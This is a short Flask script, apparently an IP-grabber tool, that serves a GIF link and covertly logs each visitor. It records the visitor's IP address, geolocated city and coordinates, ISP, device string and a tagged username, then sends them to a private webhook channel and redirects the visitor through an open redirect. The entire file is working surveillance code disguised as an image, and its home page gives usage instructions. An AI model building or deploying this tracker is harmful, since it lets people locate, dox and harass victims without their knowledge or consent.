from flask import Flask, request, send_file, redirect
import requests
import os

app = Flask(__name__)
WEBHOOK_URL = os.getenv('WEBHOOK_URL')

def get_location(ip):
    try:
        data = requests.get(f"https://ipapi.co/{ip}/json/").json()
        city = data.get("city", "Unknown")
        region = data.get("region", "Unknown")
        country = data.get("country_name", "Unknown")
        lat = data.get("latitude")
        lon = data.get("longitude")
        isp = data.get("org", "Unknown")
        location = f"{city}, {region}, {country}"
        coords = f"({lat}, {lon})" if lat and lon else "Unknown"
        return location, coords, isp
    except:
        return "Unknown", "Unknown", "Unknown"

@app.route('/image0.gif')
def track():
    # Get real IP
    forwarded = request.headers.get('X-Forwarded-For')
    ip = forwarded.split(',')[0] if forwarded else request.remote_addr
    user = request.args.get('user', 'Unknown')
    ua = request.headers.get('User-Agent', 'Unknown')[:100]
    location, coords, isp = get_location(ip)

    # Log to private #cag-logs
    if WEBHOOK_URL:
        payload = {
            "content": f"**GIF Clicked & Redirected**\n"
                       f"**User:** `{user}`\n"
                       f"**IP:** `{ip}`\n"
                       f"**Location:** {location}\n"
                       f"**Coordinates:** `{coords}`\n"
                       f"**ISP:** `{isp}`\n"
                       f"**Device:** `{ua}`..."
        }
        try:
            requests.post(WEBHOOK_URL, json=payload)
        except:
            pass

    # Get redirect URL from ?to=
    redirect_url = request.args.get('to', 'https://discord.gg/yourserver')
    
    # Show GIF + redirect
    response = send_file('image0.gif', mimetype='image/gif')
    response.headers['Refresh'] = f'0; url={redirect_url}'
    return response

@app.route('/')
def home():
    return "Tracker live. Use /image0.gif?user=Name&to=https://example.com"

if __name__ == '__main__':
    app.run()


